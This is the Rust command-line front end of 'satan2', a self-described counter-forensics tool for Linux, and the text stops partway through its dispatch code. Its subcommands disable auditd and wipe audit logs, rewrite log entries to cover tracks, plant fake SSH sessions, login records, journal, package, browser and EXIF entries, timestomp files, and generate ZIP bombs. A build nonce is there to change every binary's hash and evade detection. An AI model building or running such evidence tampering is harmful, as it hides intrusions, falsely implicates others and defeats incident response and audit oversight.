use clap::{Parser, Subcommand, ValueEnum};

// Build-time polymorphism: the nonce injected by build.rs (`make poly`) is
// embedded in the binary as an opaque, forcibly-retained static so every
// variant produces a distinct file hash. It is never executed nor printed.
#[used]
static BUILD_NONCE: &str = env!("SATAN2_BUILD_NONCE");

#[cfg(target_os = "linux")]
use satan2_core::{
    ata::ata_secure_erase,
    auditd::{wipe_audit_logs, AuditStats},
    browser_forge::{forge_browser_history, BrowserForgeOpts},
    browser_linux::wipe_browser_history_linux,
    docker_cover::wipe_docker_artifacts,
    exif_forge::{
        forge_jpeg_exif, forge_mp4_metadata, forge_pdf_metadata, ExifForgeOpts, Mp4MetaOpts,
        PdfMetaOpts,
    },
    forge_journal::{forge_journal, JournalForgeOpts},
    forge_wtmp::{forge_wtmp, WtmpForgeOpts},
    fs_kill::{fs_kill_filesystem, fs_kill_partition_table},
    lastlog_forge::{forge_lastlog, wipe_lastlog},
    log_forge::{forge_logs, LogForgeOpts},
    log_poison::{log_poison, LogpMode, LogpOpts, LogpReplace, LogpStats},
    memory_wipe::wipe_memory,
    meta::{meta_process, MetaOpts, SigStrategy, TsStrategy},
    net_clean::{net_clean_all, NetCleanStats},
    nvme::NvmeDev,
    opsec_linux::{apply_opsec_linux, revert_opsec_linux},
    pkg_forge::{forge_pkg_logs, PkgForgeOpts},
    pkg_logs::wipe_pkg_logs,
    proc_clean::clean_proc_artifacts,
    secure_delete::secure_delete_targets,
    self_audit::audit_artifacts,
    slack::{slack_wipe_dir, slack_wipe_free, SlackStats},
    ssh_clean::{ssh_clean, SshCleanOpts, SshCleanStats},
    ssh_forge::{forge_ssh, SshForgeOpts},
    stego_honey::{
        generate_honey_payload, inject_directory_honey, inject_jpeg_honey, inject_png_honey,
        inject_trailer_honey, inject_wav_honey,
    },
    swap::wipe_all_swap,
    tmpfs::{wipe_tmp_areas, TmpfsStats},
    trap_archive::{
        create_malformed_zip, create_nested_bomb, create_oversized_zip, BombOpts, MalformVariant,
    },
    trim::{trim_all_mounts, TrimStats},
    wipe::{wipe_device, WipeAlgo, WipeOpts},
};

#[cfg(target_os = "linux")]
use satan2_crypto::{
    extract_dir,
    hash::{hash_file, to_hex, HashAlgo},
    ops::{
        create_container, decrypt_container, destroy_and_encrypt, encrypt_device, encrypt_dir,
        encrypt_file, encrypt_layers, Layer,
    },
    Algorithm,
};

// ── Report ────────────────────────────────────────────────────────────────────

struct ModResult {
    module: &'static str,
    ok: bool,
    msg: Option<String>,
}

struct Report {
    dry_run: bool,
    modules: Vec<ModResult>,
}

impl Report {
    fn new(dry_run: bool) -> Self {
        Self {
            dry_run,
            modules: Vec::new(),
        }
    }

    fn push(&mut self, module: &'static str, res: Result<(), String>) {
        match &res {
            Ok(()) => eprintln!("[+] {}: ok", module),
            Err(e) => eprintln!("[!] {}: {}", module, e),
        }
        self.modules.push(ModResult {
            module,
            ok: res.is_ok(),
            msg: res.err(),
        });
    }

    fn push_ok(&mut self, module: &'static str) {
        eprintln!("[+] {}: ok", module);
        self.modules.push(ModResult {
            module,
            ok: true,
            msg: None,
        });
    }

    fn print_json(&self) {
        let mods: Vec<String> = self
            .modules
            .iter()
            .map(|m| {
                let msg_field = m
                    .msg
                    .as_ref()
                    .map(|s| {
                        format!(
                            ",\"msg\":\"{}\"",
                            s.replace('\\', "\\\\").replace('"', "\\\"")
                        )
                    })
                    .unwrap_or_default();
                format!(
                    "{{\"module\":\"{}\",\"ok\":{}{}}}",
                    m.module, m.ok, msg_field
                )
            })
            .collect();
        println!(
            "{{\"dry_run\":{},\"modules\":[{}]}}",
            self.dry_run,
            mods.join(",")
        );
    }
}

// ── CLI definition ────────────────────────────────────────────────────────────

#[derive(Parser)]
#[command(
    name = "satan2",
    version,
    about = "SATAN2 — disk sanitization and counter-forensics (Linux)"
)]
struct Cli {
    /// Print what would be done without performing any action
    #[arg(long, global = true)]
    dry_run: bool,

    /// Emit a JSON report to stdout after execution
    #[arg(long, global = true)]
    json: bool,

    #[command(subcommand)]
    command: Cmd,
}

#[derive(Subcommand)]
enum Cmd {
    // ── Orchestration ─────────────────────────────────────────────────────────
    /// Full destructive wipe: disable audit → logs → meta → slack → net → swap → tmpfs → trim
    DestroyAll {
        /// Optional block device to nuke at the end (NVMe/ATA auto-detected)
        #[arg(long)]
        device: Option<String>,
        /// Re-enable auditd after wiping audit logs
        #[arg(long)]
        reenable_audit: bool,
    },

    /// Targeted cover-tracks: log cover → ssh → net → disable audit
    CoverAll {
        /// needle:replacement pairs to scrub from logs (e.g. "10.0.0.5:10.0.0.1")
        #[arg(long)]
        replace: Vec<String>,
        /// SSH hostnames/IPs to remove from known_hosts
        #[arg(long)]
        hosts: Vec<String>,
    },

    // ── OPSEC hardening ───────────────────────────────────────────────────────
    /// Apply OPSEC hardening (nolog/stealth mode) — run BEFORE activity
    Opsec,

    /// Revert OPSEC hardening applied by 'opsec'
    OpsecRevert,

    // ── Storage ───────────────────────────────────────────────────────────────
    /// Firmware-level NVMe secure erase (Sanitize / Format NVM)
    NvmeErase { device: String },

    /// ATA Secure Erase via SG_IO passthrough
    AtaErase { device: String },

    /// Multi-pass software wipe (DoD / Schneier / Gutmann)
    Wipe {
        device: String,
        #[arg(long, value_enum, default_value = "random")]
        algo: WipeAlgoArg,
        #[arg(long)]
        verify: bool,
    },

    /// Destroy partition table (GPT + MBR)
    KillPt { device: String },

    /// Destroy filesystem superblocks (ext4 / XFS / Btrfs)
    KillFs { device: String },

    /// Wipe swap partitions/files
    Swap {
        #[arg(long)]
        reenable: bool,
    },

    /// Issue FITRIM ioctl on all mounted writable filesystems
    Trim,

    // ── Filesystem metadata ───────────────────────────────────────────────────
    /// Scramble timestamps, mask file signatures, remove xattrs
    Meta {
        path: String,
        #[arg(long)]
        recursive: bool,
        #[arg(long, value_enum, default_value = "random-plausible")]
        ts: TsArg,
        #[arg(long)]
        ts_ref: Option<String>,
        #[arg(long)]
        sig_mask: bool,
        #[arg(long)]
        xattrs: bool,
    },

    /// Wipe cluster tips and/or free space
    Slack {
        #[arg(long)]
        dir: Option<String>,
        #[arg(long)]
        recursive: bool,
        #[arg(long)]
        free: Option<String>,
    },

    /// Clear /tmp, /dev/shm, core dumps, crash dirs
    Tmpfs,

    // ── Logs & traces ─────────────────────────────────────────────────────────
    /// Sanitize and/or misdirect system logs
    LogPoison {
        #[arg(long, value_enum, default_value = "cover")]
        mode: ModeArg,
        #[arg(long)]
        replace: Vec<String>,
        #[arg(long)]
        auth: bool,
        #[arg(long)]
        syslog: bool,
        #[arg(long)]
        wtmp: bool,
        #[arg(long)]
        history: bool,
        #[arg(long)]
        journal: bool,
        #[arg(long)]
        extra: Vec<String>,
    },

    /// Disable auditd and overwrite audit logs
    Auditd {
        #[arg(long)]
        reenable: bool,
    },

    // ── Network & SSH ─────────────────────────────────────────────────────────
    /// Flush ARP cache, conntrack table, DNS resolver cache
    NetClean,

    /// Clean SSH known_hosts / authorized_keys
    SshClean {
        /// Hostnames/IPs to remove from known_hosts (COVER mode, empty = destroy all)
        #[arg(long)]
        hosts: Vec<String>,
        /// Destroy all .ssh artifacts (known_hosts, authorized_keys, keys, config)
        #[arg(long)]
        destroy_all: bool,
        /// Also wipe SSH identity / host keys
        #[arg(long)]
        wipe_keys: bool,
        /// Also wipe ~/.ssh/config
        #[arg(long)]
        wipe_config: bool,
    },

    // ── Artifact cleanup ──────────────────────────────────────────────────────
    /// Wipe browser history / cache (Firefox, Chrome, Chromium, Brave, Edge, Opera)
    BrowserLinux,

    /// Wipe package manager logs (dpkg/apt/yum/dnf/pacman/zypper + pip/npm/gem caches)
    PkgLogs,

    // ── ForgeMode — plant plausible artifacts ─────────────────────────────────
    /// Inject fake SSH sessions, sudo events, cron entries into auth.log / syslog / bash_history
    ForgeLog {
        /// Source IP to attribute fake SSH sessions to
        #[arg(long, default_value = "10.0.0.1")]
        fake_ip: String,
        /// Username for fake auth events
        #[arg(long, default_value = "admin")]
        fake_user: String,
        /// Number of fake sessions to inject
        #[arg(long, default_value = "10")]
        n_sessions: u32,
        /// Start of injection window (Unix timestamp; default: 24h ago)
        #[arg(long)]
        ts_start: Option<i64>,
        /// End of injection window (Unix timestamp; default: now)
        #[arg(long)]
        ts_end: Option<i64>,
        /// Hostname to use in log lines (default: real hostname)
        #[arg(long)]
        fake_hostname: Option<String>,
        /// Inject into auth.log / /var/log/secure
        #[arg(long)]
        auth: bool,
        /// Inject into syslog / /var/log/messages
        #[arg(long)]
        syslog: bool,
        /// Forge bash_history for all discovered user home dirs
        #[arg(long)]
        bash: bool,
    },

    /// Inject fake package install entries into dpkg/apt/pacman/dnf logs
    ForgePkgLogs {
        /// Number of fake package installs to inject
        #[arg(long, default_value = "15")]
        n_packages: u32,
        /// Start of injection window (Unix timestamp; default: 48h ago)
        #[arg(long)]
        ts_start: Option<i64>,
        /// End of injection window (Unix timestamp; default: now)
        #[arg(long)]
        ts_end: Option<i64>,
    },

    /// Inject fake host-key entries into ~/.ssh/known_hosts
    ForgeSsh {
        /// Specific hostnames/IPs to add (one per flag)
        #[arg(long)]
        hosts: Vec<String>,
        /// Number of extra random internal hosts to generate
        #[arg(long, default_value = "5")]
        n_random: u32,
        /// Limit to specific home dir(s); default: all home dirs
        #[arg(long)]
        home: Vec<String>,
    },

    /// Inject fake URLs into Firefox places.sqlite and Chromium History
    ForgeBrowser {
        /// Number of fake URLs to inject per database
        #[arg(long, default_value = "20")]
        n_urls: u32,
        /// Start of injection window (Unix timestamp; default: 72h ago)
        #[arg(long)]
        ts_start: Option<i64>,
        /// End of injection window (Unix timestamp; default: now)
        #[arg(long)]
        ts_end: Option<i64>,
        /// Target a specific SQLite file instead of auto-discovery
        #[arg(long)]
        profile: Option<String>,
    },

    /// Inject fake login sessions into /var/log/wtmp and /var/run/utmp (binary struct utmp format)
    ForgeWtmp {
        /// Source IP for fake logins
        #[arg(long, default_value = "10.0.0.1")]
        fake_ip: String,
        /// Username for fake sessions
        #[arg(long, default_value = "admin")]
        fake_user: String,
        /// Number of login sessions to inject
        #[arg(long, default_value = "5")]
        n_sessions: u32,
        /// Start of injection window (Unix timestamp; default: 48h ago)
        #[arg(long)]
        ts_start: Option<i64>,
        /// End of injection window (Unix timestamp; default: now)
        #[arg(long)]
        ts_end: Option<i64>,
    },

    /// Inject fake entries into systemd journal via /run/systemd/journal/socket
    ForgeJournal {
        /// Source IP for fake SSH sessions
        #[arg(long, default_value = "10.0.0.1")]
        fake_ip: String,
        /// Username for fake auth entries
        #[arg(long, default_value = "admin")]
        fake_user: String,
        /// Number of fake journal entries to inject
        #[arg(long, default_value = "10")]
        n_entries: u32,
        /// Start of injection window (Unix timestamp; default: 48h ago)
        #[arg(long)]
        ts_start: Option<i64>,
        /// End of injection window (Unix timestamp; default: now)
        #[arg(long)]
        ts_end: Option<i64>,
    },

    /// Per-file multi-pass secure deletion (0xFF → zeros → random → unlink)
    SecureDelete {
        /// Files or directories to securely delete
        targets: Vec<String>,
        /// Number of overwrite passes (minimum 3)
        #[arg(long, default_value = "7")]
        passes: u32,
    },

    /// Purge RAM: flush page cache + fill free memory with zeros
    MemoryWipe,

    /// Clean process-trace artifacts: recently-used.xbel, thumbnails, session errors, etc.
    ProcClean,

    /// Wipe Docker forensic artifacts: container logs, client credentials, build cache
    DockerCover,

    /// Post-cleanup self-audit: list detectable residual artifacts
    SelfAudit {
        /// Emit findings as JSON array to stdout (separate from the --json report flag)
        #[arg(long = "findings-json")]
        findings_json: bool,
    },

    /// Zero out /var/log/lastlog entries for all discovered user UIDs
    WipeLastlog,

    /// Forge /var/log/lastlog entries with plausible last-login timestamps
    ForgeLastlog {
        /// Start of injection window (Unix timestamp; default: 7 days ago)
        #[arg(long)]
        ts_start: Option<i64>,
        /// End of injection window (Unix timestamp; default: now)
        #[arg(long)]
        ts_end: Option<i64>,
    },

    /// Forge embedded metadata in a JPEG (EXIF), PDF (/Info), or MP4 (mvhd+©too) file
    ExifForge(Box<ExifForgeArgs>),

    /// Generate a compression trap archive (nested ZIP bomb / oversized / malformed ZIP)
    TrapArchive {
        /// Output archive path
        output: String,
        /// Trap variant to generate
        #[arg(long, value_enum, default_value = "nested-bomb")]
        variant: TrapVariantArg,
        /// Nesting depth (nested-bomb; 3–5 typical)
        #[arg(long, default_value = "3")]
        layers: u32,
        /// Archives per layer (nested-bomb; 10 typical)
        #[arg(long, default_value = "10")]
        width: u32,
        /// Uncompressed size per leaf file in MiB (nested-bomb)
        #[arg(long, default_value = "10")]
        leaf_size_mib: u32,
        /// Claimed uncompressed size in GiB (oversized variant)
        #[arg(long, default_value = "4")]
        claimed_gb: u32,
        /// Malformation type (malformed variant)
        #[arg(long, value_enum, default_value = "bad-crc")]
        malform: MalformArg,
    },

    /// Inject fake steganographic payloads into media files (JPEG/PNG/WAV) or a whole directory
    StegoHoney {
        /// Target media file or directory (directories processed recursively, depth ≤ 3)
        path: String,
        /// PRNG seed for the honey payload (default: derived from current time)
        #[arg(long)]
        seed: Option<u64>,
        /// Honey payload size in bytes
        #[arg(long, default_value = "512")]
        payload_size: usize,
        /// Fake tool signature for the generic trailer fallback (non-JPEG/PNG/WAV files)
        #[arg(long, default_value = "OUTGUESS13")]
        tool_sig: String,
    },

    /// Set atime + mtime of a file to a specific timestamp (targeted timestomping)
    Timestomp {
        /// Target file path
        path: String,
        /// Timestamp as Unix epoch integer or ISO-8601 string (YYYY-MM-DDTHH:MM:SS)
        ts: String,
    },

    /// Run ALL forge modules with a single command (log + pkg + ssh + browser + wtmp + journal)
    ForgeAll {
        /// Source IP for fake SSH sessions
        #[arg(long, default_value = "10.0.0.1")]
        fake_ip: String,
        /// Username for fake auth entries
        #[arg(long, default_value = "admin")]
        fake_user: String,
        /// Scale factor (approx. entries per module)
        #[arg(long, default_value = "10")]
        n: u32,
        /// Start of injection window (Unix ts; default: 48h ago)
        #[arg(long)]
        ts_start: Option<i64>,
        /// End of injection window (Unix ts; default: now)
        #[arg(long)]
        ts_end: Option<i64>,
    },

    // ── Encryption (SATAN2CV) ─────────────────────────────────────────────────
    /// Create a new empty SATAN2CV encrypted container
    CreateContainer {
        output: String,
        /// Data region size in MiB
        #[arg(long, default_value = "100")]
        size_mib: u64,
        #[arg(long, value_enum, default_value = "aes")]
        algo: CryptoAlgoArg,
        /// PBKDF2-HMAC-SHA512 iterations
        #[arg(long, default_value = "300000")]
        kdf_iters: u32,
        /// Env var holding the passphrase (default: SATAN2_PASS)
        #[arg(long, default_value = "SATAN2_PASS")]
        pass_env: String,
    },

    /// Encrypt a file into a SATAN2CV container
    EncryptFile {
        input: String,
        output: String,
        #[arg(long, value_enum, default_value = "aes")]
        algo: CryptoAlgoArg,
        #[arg(long, default_value = "300000")]
        kdf_iters: u32,
        #[arg(long, default_value = "SATAN2_PASS")]
        pass_env: String,
    },

    /// Encrypt a directory into a SATAN2CV container (packed archive)
    EncryptDir {
        input: String,
        output: String,
        #[arg(long, value_enum, default_value = "aes")]
        algo: CryptoAlgoArg,
        #[arg(long, default_value = "300000")]
        kdf_iters: u32,
        #[arg(long, default_value = "SATAN2_PASS")]
        pass_env: String,
    },

    /// Decrypt a SATAN2CV single-file container to a file
    Decrypt {
        input: String,
        output: String,
        #[arg(long, default_value = "SATAN2_PASS")]
        pass_env: String,
    },

    /// Extract a dir-encrypted SATAN2CV container back to individual files
    Extract {
        input: String,
        output: String,
        #[arg(long, default_value = "SATAN2_PASS")]
        pass_env: String,
    },

    /// Encrypt a file with N nested layers (containers inside containers).
    /// Layers are applied innermost → outermost in flag order; each layer gets
    /// its passphrase from <PASS_ENV>_<i> (e.g. SATAN2_PASS_1..N; layer 1 falls
    /// back to <PASS_ENV>) or a no-echo terminal prompt. Decrypt by peeling the
    /// layers with N sequential `decrypt` runs, outermost passphrase first.
    EncryptLayers {
        input: String,
        output: String,
        /// Layer algorithm — repeat per layer, innermost first (min 2)
        #[arg(long, value_enum, required = true)]
        layer: Vec<CryptoAlgoArg>,
        #[arg(long, default_value = "300000")]
        kdf_iters: u32,
        /// Base name of the per-layer passphrase env vars (default: SATAN2_PASS)
        #[arg(long, default_value = "SATAN2_PASS")]
        pass_env: String,
    },

    /// Encrypt a block device in-place (IRREVERSIBLE — all data replaced)
    EncryptDevice {
        device: String,
        #[arg(long, value_enum, default_value = "aes")]
        algo: CryptoAlgoArg,
        #[arg(long, default_value = "300000")]
        kdf_iters: u32,
        #[arg(long, default_value = "SATAN2_PASS")]
        pass_env: String,
    },

    /// Encrypt source paths into a container then 3-pass wipe the originals
    DestroyAndEncrypt {
        sources: Vec<String>,
        #[arg(long)]
        output: String,
        #[arg(long, value_enum, default_value = "aes")]
        algo: CryptoAlgoArg,
        #[arg(long, default_value = "300000")]
        kdf_iters: u32,
        #[arg(long, default_value = "SATAN2_PASS")]
        pass_env: String,
    },

    // ── Hashing ───────────────────────────────────────────────────────────────
    /// Compute a cryptographic hash of a file
    Hash {
        path: String,
        #[arg(long, value_enum, default_value = "sha256")]
        algo: HashAlgoArg,
    },
}

// ── Value enums ───────────────────────────────────────────────────────────────

#[derive(ValueEnum, Clone, Debug)]
enum WipeAlgoArg {
    Random,
    Dod,
    Schneier,
    Gutmann,
}

#[derive(ValueEnum, Clone)]
enum TsArg {
    RandomPlausible,
    RandomFull,
    Epoch,
    Clone,
}

#[derive(ValueEnum, Clone)]
enum ModeArg {
    Cover,
    Destroy,
}

#[derive(ValueEnum, Clone, Debug)]
enum CryptoAlgoArg {
    Aes,
    Twofish,
    Camellia,
    /// AES-256 + Twofish-256 cascade (inner Twofish, outer AES)
    Cascade,
    Kuznyechik,
}

#[derive(ValueEnum, Clone, Debug)]
enum HashAlgoArg {
    Sha256,
    Sha512,
    Blake2b,
    Sha3256,
    Sha3512,
}

#[derive(ValueEnum, Clone, Debug)]
enum TrapVariantArg {
    NestedBomb,
    Oversized,
    Malformed,
}

#[derive(ValueEnum, Clone, Debug)]
enum MalformArg {
    BadCrc,
    TruncatedData,
    CorruptSignature,
    InfiniteRecurse,
}

/// Options for `exif-forge` (boxed in the Cmd enum to keep variant sizes small)
#[derive(clap::Args)]
struct ExifForgeArgs {
    /// Target file — format auto-detected from extension (.jpg/.jpeg/.pdf/.mp4)
    path: String,
    /// Camera manufacturer (JPEG)
    #[arg(long, default_value = "NIKON CORPORATION")]
    make: String,
    /// Camera model (JPEG)
    #[arg(long, default_value = "NIKON D850")]
    model: String,
    /// Editing software string (JPEG)
    #[arg(long, default_value = "Adobe Photoshop 24.7.3 (Windows)")]
    software: String,
    /// Artist / copyright string (JPEG; empty = omit)
    #[arg(long)]
    artist: Option<String>,
    /// EXIF datetime "YYYY:MM:DD HH:MM:SS" (JPEG)
    #[arg(long, default_value = "2023:11:07 09:42:18")]
    datetime: String,
    /// GPS latitude, decimal degrees (+N -S) (JPEG)
    #[arg(long, default_value = "48.8566")]
    gps_lat: f64,
    /// GPS longitude, decimal degrees (+E -W) (JPEG)
    #[arg(long, default_value = "2.3522")]
    gps_lon: f64,
    /// Omit the GPS IFD entirely (JPEG)
    #[arg(long)]
    no_gps: bool,
    /// ISO speed (JPEG)
    #[arg(long, default_value = "200")]
    iso: u16,
    /// Focal length in mm (JPEG)
    #[arg(long, default_value = "50")]
    focal_length: u32,
    /// Pixel X dimension (JPEG)
    #[arg(long, default_value = "4720")]
    pixel_x: u32,
    /// Pixel Y dimension (JPEG)
    #[arg(long, default_value = "3152")]
    pixel_y: u32,
    /// PDF /Author
    #[arg(long, default_value = "J. Doe")]
    pdf_author: String,
    /// PDF /Creator
    #[arg(long, default_value = "Microsoft® Word for Microsoft 365")]
    pdf_creator: String,
    /// PDF /Producer
    #[arg(long, default_value = "Microsoft® Word for Microsoft 365")]
    pdf_producer: String,
    /// PDF /Title
    #[arg(long, default_value = "Quarterly Report")]
    pdf_title: String,
    /// PDF creation date as YYYYMMDDHHmmSS (the D: prefix is added)
    #[arg(long, default_value = "20231107094218")]
    pdf_created: String,
    /// PDF modification date as YYYYMMDDHHmmSS
    #[arg(long, default_value = "20231107101533")]
    pdf_modified: String,
    /// MP4 encoder string (©too atom)
    #[arg(long, default_value = "Lavf60.16.100")]
    mp4_encoder: String,
    /// MP4 mvhd creation time (seconds since 1904-01-01)
    #[arg(long, default_value = "3782194938")]
    mp4_ts_create: u32,
    /// MP4 mvhd modification time (seconds since 1904-01-01)
    #[arg(long, default_value = "3782194938")]
    mp4_ts_modify: u32,
}

// ── Entry point ───────────────────────────────────────────────────────────────

fn main() {
    #[cfg(not(target_os = "linux"))]
    {
        eprintln!("[!] satan2 Linux core requires Linux. Use satan2_win on Windows.");
        std::process::exit(1);
    }
    #[cfg(target_os = "linux")]
    run();
}

// ── Linux implementation ──────────────────────────────────────────────────────

#[cfg(target_os = "linux")]
fn run() {
    let cli = Cli::parse();
    let dry = cli.dry_run;
    let json = cli.json;

    let mut report = Report::new(dry);

    match cli.command {
        // ── Orchestration ─────────────────────────────────────────────────────
        Cmd::DestroyAll {
            device,
            reenable_audit,
        } => {
            eprintln!("[*] DESTROY ALL — Linux");
            run_destroy_all(dry, reenable_audit, device.as_deref(), &mut report);
        }

        Cmd::CoverAll { replace, hosts } => {
            eprintln!("[*] COVER ALL — Linux");
            run_cover_all(dry, &replace, &hosts, &mut report);
        }

        // ── OPSEC hardening ───────────────────────────────────────────────────
        Cmd::Opsec => {
            eprintln!("[*] Applying OPSEC hardening...");
            if !dry {
                let stats = apply_opsec_linux(true);
                if stats.errors > 0 {
                    report.push("opsec", Err(format!("{} error(s)", stats.errors)));
                } else {
                    report.push_ok("opsec");
                }
            } else {
                report.push_ok("opsec [dry-run]");
            }
        }

        Cmd::OpsecRevert => {
            eprintln!("[*] Reverting OPSEC hardening...");
            if !dry {
                revert_opsec_linux(true);
                report.push_ok("opsec-revert");
            } else {
                report.push_ok("opsec-revert [dry-run]");
            }
        }

        // ── Storage ───────────────────────────────────────────────────────────
        Cmd::NvmeErase { device } => {
            eprintln!("[*] NVMe secure erase: {}", device);
            if !dry {
                report.push("nvme-erase", NvmeDev::secure_erase(&device));
            } else {
                report.push_ok("nvme-erase [dry-run]");
            }
        }

        Cmd::AtaErase { device } => {
            eprintln!("[*] ATA secure erase: {}", device);
            if !dry {
                report.push("ata-erase", ata_secure_erase(&device));
            } else {
                report.push_ok("ata-erase [dry-run]");
            }
        }

        Cmd::Wipe {
            device,
            algo,
            verify,
        } => {
            let algo = match algo {
                WipeAlgoArg::Random => WipeAlgo::Random,
                WipeAlgoArg::Dod => WipeAlgo::Dod,
                WipeAlgoArg::Schneier => WipeAlgo::Schneier,
                WipeAlgoArg::Gutmann => WipeAlgo::Gutmann,
            };
            let opts = WipeOpts {
                algo,
                verify_last: verify,
                verbose: true,
            };
            eprintln!("[*] Wipe: {} ({:?})", device, opts.algo);
            if !dry {
                report.push("wipe", wipe_device(&device, &opts));
            } else {
                report.push_ok("wipe [dry-run]");
            }
        }

        Cmd::KillPt { device } => {
            eprintln!("[*] Kill partition table: {}", device);
            if !dry {
                report.push("kill-pt", fs_kill_partition_table(&device));
            } else {
                report.push_ok("kill-pt [dry-run]");
            }
        }

        Cmd::KillFs { device } => {
            eprintln!("[*] Kill filesystem: {}", device);
            if !dry {
                report.push("kill-fs", fs_kill_filesystem(&device));
            } else {
                report.push_ok("kill-fs [dry-run]");
            }
        }

        Cmd::Swap { reenable } => {
            eprintln!("[*] Wipe swap...");
            if !dry {
                report.push("swap", wipe_all_swap(reenable));
            } else {
                report.push_ok("swap [dry-run]");
            }
        }

        Cmd::Trim => {
            eprintln!("[*] FITRIM all mounts...");
            if !dry {
                let mut s = TrimStats::default();
                report.push("trim", trim_all_mounts(&mut s));
            } else {
                report.push_ok("trim [dry-run]");
            }
        }

        // ── Filesystem metadata ───────────────────────────────────────────────
        Cmd::Meta {
            path,
            recursive,
            ts,
            ts_ref,
            sig_mask,
            xattrs,
        } => {
            let ts_strategy = map_ts(ts);
            let opts = MetaOpts {
                do_timestamps: true,
                do_sig_mask: sig_mask,
                do_xattrs: xattrs,
                recursive,
                ts_strategy,
                ts_clone_ref: ts_ref,
                sig_strategy: SigStrategy::Random,
                verbose: true,
            };
            eprintln!("[*] Meta: {}", path);
            if !dry {
                report.push("meta", meta_process(&path, &opts));
            } else {
                report.push_ok("meta [dry-run]");
            }
        }

        Cmd::Slack {
            dir,
            recursive,
            free,
        } => {
            eprintln!("[*] Slack wipe...");
            if !dry {
                let mut s = SlackStats::default();
                let mut res = Ok(());
                if let Some(d) = dir {
                    res = slack_wipe_dir(&d, recursive, &mut s);
                }
                if res.is_ok() {
                    if let Some(mp) = free {
                        res = slack_wipe_free(&mp, &mut s);
                    }
                }
                report.push("slack", res);
            } else {
                report.push_ok("slack [dry-run]");
            }
        }

        Cmd::Tmpfs => {
            eprintln!("[*] Wipe tmpfs areas...");
            if !dry {
                let mut s = TmpfsStats::default();
                report.push("tmpfs", wipe_tmp_areas(&mut s));
            } else {
                report.push_ok("tmpfs [dry-run]");
            }
        }

        // ── Logs & traces ─────────────────────────────────────────────────────
        Cmd::LogPoison {
            mode,
            replace,
            auth,
            syslog,
            wtmp,
            history,
            journal,
            extra,
        } => {
            let logp_mode = match mode {
                ModeArg::Cover => LogpMode::Cover,
                ModeArg::Destroy => LogpMode::Destroy,
            };
            let replacements = parse_replacements(&replace);
            let opts = LogpOpts {
                mode: logp_mode,
                replacements,
                scramble_ts: false,
                ts_window_start: 0,
                ts_window_end: 0,
                do_auth_log: auth,
                do_syslog: syslog,
                do_wtmp: wtmp,
                do_bash_history: history,
                do_journal: journal,
                extra_logs: extra,
                verbose: true,
            };
            if !dry {
                let mut s = LogpStats::default();
                report.push("log-poison", log_poison(&opts, &mut s));
            } else {
                report.push_ok("log-poison [dry-run]");
            }
        }

        Cmd::Auditd { reenable } => {
            eprintln!("[*] Wipe audit logs...");
            if !dry {
                let mut s = AuditStats::default();
                report.push("auditd", wipe_audit_logs(reenable, &mut s));
            } else {
                report.push_ok("auditd [dry-run]");
            }
        }

        // ── Network & SSH ─────────────────────────────────────────────────────
        Cmd::NetClean => {
            eprintln!("[*] Net artifact cleanup...");
            if !dry {
                let mut s = NetCleanStats::default();
                net_clean_all(&mut s);
                report.push_ok("net-clean");
            } else {
                report.push_ok("net-clean [dry-run]");
            }
        }

        Cmd::SshClean {
            hosts,
            destroy_all,
            wipe_keys,
            wipe_config,
        } => {
            eprintln!("[*] SSH artifact cleanup...");
            if !dry {
                let host_refs: Vec<&str> = hosts.iter().map(String::as_str).collect();
                let opts = SshCleanOpts {
                    hosts: &host_refs,
                    key_fragments: &[],
                    destroy_all,
                    wipe_keys,
                    wipe_config,
                };
                let mut s = SshCleanStats::default();
                report.push("ssh-clean", ssh_clean(&opts, &mut s));
            } else {
                report.push_ok("ssh-clean [dry-run]");
            }
        }

        // ── Artifact cleanup ──────────────────────────────────────────────────
        Cmd::BrowserLinux => {
            eprintln!("[*] Browser history cleanup (Linux)...");
            if !dry {
                wipe_browser_history_linux(true);
                report.push_ok("browser-linux");
            } else {
                report.push_ok("browser-linux [dry-run]");
            }
        }

        Cmd::PkgLogs => {
            eprintln!("[*] Package manager logs cleanup...");
            if !dry {
                wipe_pkg_logs(true);
                report.push_ok("pkg-logs");
            } else {
                report.push_ok("pkg-logs [dry-run]");
            }
        }

        // ── ForgeMode ─────────────────────────────────────────────────────────
        Cmd::ForgeLog {
            fake_ip,
            fake_user,
            n_sessions,
            ts_start,
            ts_end,
            fake_hostname,
            auth,
            syslog,
            bash,
        } => {
            let now = unsafe { libc::time(std::ptr::null_mut()) };
            let ts_e = ts_end.unwrap_or(now);
            let ts_s = ts_start.unwrap_or(ts_e - 86_400);
            eprintln!(
                "[*] ForgeLog: {} sessions, IP={}, user={}",
                n_sessions, fake_ip, fake_user
            );

            // Collect bash_history paths when --bash is set
            let bash_paths: Vec<String> = if bash {
                let mut v = vec!["/root/.bash_history".to_string()];
                if let Ok(rd) = std::fs::read_dir("/home") {
                    for e in rd.flatten() {
                        v.push(e.path().join(".bash_history").to_string_lossy().to_string());
                    }
                }
                v
            } else {
                vec![]
            };

            if !dry {
                let opts = LogForgeOpts {
                    fake_ip,
                    fake_user,
                    n_sessions,
                    ts_start: ts_s,
                    ts_end: ts_e,
                    fake_hostname,
                    do_auth: auth,
                    do_syslog: syslog,
                    bash_history_paths: bash_paths,
                    verbose: true,
                };
                let s = forge_logs(&opts);
                if s.errors > 0 {
                    report.push("forge-log", Err(format!("{} error(s)", s.errors)));
                } else {
                    eprintln!(
                        "[+] forge-log: {} lines written, {} files",
                        s.lines_written, s.files_touched
                    );
                    report.push_ok("forge-log");
                }
            } else {
                report.push_ok("forge-log [dry-run]");
            }
        }

        Cmd::ForgePkgLogs {
            n_packages,
            ts_start,
            ts_end,
        } => {
            let now = unsafe { libc::time(std::ptr::null_mut()) };
            let ts_e = ts_end.unwrap_or(now);
            let ts_s = ts_start.unwrap_or(ts_e - 172_800); // 48h
            eprintln!("[*] ForgePkgLogs: {} packages", n_packages);
            if !dry {
                let opts = PkgForgeOpts {
                    n_packages,
                    ts_start: ts_s,
                    ts_end: ts_e,
                    verbose: true,
                };
                let s = forge_pkg_logs(&opts);
                eprintln!(
                    "[+] forge-pkg-logs: {} lines, {} files",
                    s.lines_written, s.files_touched
                );
                if s.errors > 0 {
                    report.push("forge-pkg-logs", Err(format!("{} error(s)", s.errors)));
                } else {
                    report.push_ok("forge-pkg-logs");
                }
            } else {
                report.push_ok("forge-pkg-logs [dry-run]");
            }
        }

        Cmd::ForgeSsh {
            hosts,
            n_random,
            home,
        } => {
            eprintln!(
                "[*] ForgeSsh: {} explicit hosts + {} random",
                hosts.len(),
                n_random
            );
            if !dry {
                let opts = SshForgeOpts {
                    hosts,
                    n_random,
